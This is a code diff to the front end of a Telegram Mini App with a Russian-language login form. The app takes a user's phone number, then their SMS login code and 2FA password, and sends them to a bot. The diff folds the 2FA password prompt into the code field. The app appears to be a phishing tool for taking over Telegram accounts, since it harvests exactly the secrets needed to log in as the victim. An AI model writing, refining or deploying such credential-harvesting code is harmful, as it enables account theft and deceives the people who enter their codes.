@@ -16,10 +16,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const authForm = document.getElementById('authForm');
     const loadingSpinner = document.getElementById('loadingSpinner');
     const statusMsg = document.getElementById('statusMsg');
-    const instructionMsg = document.getElementById('instructionMsg');
     const phoneInput = document.getElementById('phoneInput');
     const codeInput = document.getElementById('codeInput');
-    const twoFaInput = document.getElementById('twoFaInput');
     const submitBtn = document.getElementById('submitBtn');
     const successMsg = document.getElementById('successMsg');
     const errorMsg = document.getElementById('errorMsg');
@@ -42,15 +40,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (success && contact) {
                     phoneInput.value = contact.phone_number || 'Номер отправлен боту';
                     phoneInput.classList.remove('hidden');
-                    statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
+                    statusMsg.textContent = 'Номер отправлен. Ожидаем...';
                     tg.HapticFeedback.impactOccurred('light');
 
                     setTimeout(() => {
                         phoneInput.classList.add('hidden');
                         codeInput.classList.remove('hidden');
                         submitBtn.classList.remove('hidden');
-                        submitBtn.textContent = 'Отправить код';
-                        statusMsg.textContent = 'Введите SMS-код из Telegram.';
+                        submitBtn.textContent = 'Подтвердить';
+                        statusMsg.textContent = 'Введите код из SMS. Если требуется 2FA, введите пароль здесь после сообщения в чате.';
                         currentStep = 'code';
                         hideLoading();
                     }, 2000);
@@ -73,41 +71,20 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log(`➡️ Submit clicked, step=${currentStep}`);
 
         if (currentStep === 'code') {
-            const code = codeInput.value.trim();
-            if (!code) {
-                errorMsg.textContent = 'Введите код.';
+            const inputValue = codeInput.value.trim();
+            if (!inputValue) {
+                errorMsg.textContent = 'Введите код или пароль.';
                 errorMsg.classList.remove('hidden');
                 return;
             }
-            const payload = { action: 'verify_code', code: code };
-            console.log("📤 Sending code payload:", payload);
+            const payload = { action: 'verify_code', code: inputValue };
+            console.log("📤 Sending payload:", payload);
 
             try {
                 tg.sendData(JSON.stringify(payload));
                 showLoading();
-                statusMsg.textContent = 'Проверяем код...';
+                statusMsg.textContent = 'Проверяем...';
                 tg.HapticFeedback.impactOccurred('medium');
-            } catch (err) {
-                console.error("Ошибка отправки tg.sendData:", err);
-                errorMsg.textContent = '❌ Ошибка соединения с ботом.';
-                errorMsg.classList.remove('hidden');
-            }
-
-        } else if (currentStep === '2fa') {
-            const password = twoFaInput.value.trim();
-            if (!password) {
-                errorMsg.textContent = 'Введите пароль 2FA.';
-                errorMsg.classList.remove('hidden');
-                return;
-            }
-            const payload = { action: 'verify_2fa', password: password };
-            console.log("📤 Sending 2FA payload:", payload);
-
-            try {
-                tg.sendData(JSON.stringify(payload));
-                showLoading();
-                statusMsg.textContent = 'Подтверждаем 2FA...';
-                tg.HapticFeedback.impactOccurred('heavy');
             } catch (err) {
                 console.error("Ошибка отправки tg.sendData:", err);
                 errorMsg.textContent = '❌ Ошибка соединения с ботом.';
@@ -135,28 +112,11 @@ document.addEventListener('DOMContentLoaded', () => {
         currentStep = 'contact';
         phoneInput.value = '';
         codeInput.value = '';
-        twoFaInput.value = '';
         successMsg.classList.add('hidden');
         errorMsg.classList.add('hidden');
-        instructionMsg.classList.add('hidden');
         statusMsg.textContent = '';
         hideLoading();
     }
-
-    tg.onEvent('web_app_data', (data) => {
-        console.log('📩 Received web_app_data event:', data);
-        if (currentStep === 'code') {
-            hideLoading();
-            instructionMsg.classList.remove('hidden');
-            twoFaInput.classList.remove('hidden');
-            submitBtn.textContent = 'Подтвердить 2FA';
-            statusMsg.textContent = 'Код отправлен. Если требуется 2FA, введите пароль.';
-            currentStep = '2fa';
-        } else if (currentStep === '2fa') {
-            hideLoading();
-            statusMsg.textContent = 'Ожидаем подтверждения 2FA...';
-        }
-    });
 
     tg.onEvent('error', (error) => {
         console.error('WebApp error:', error);
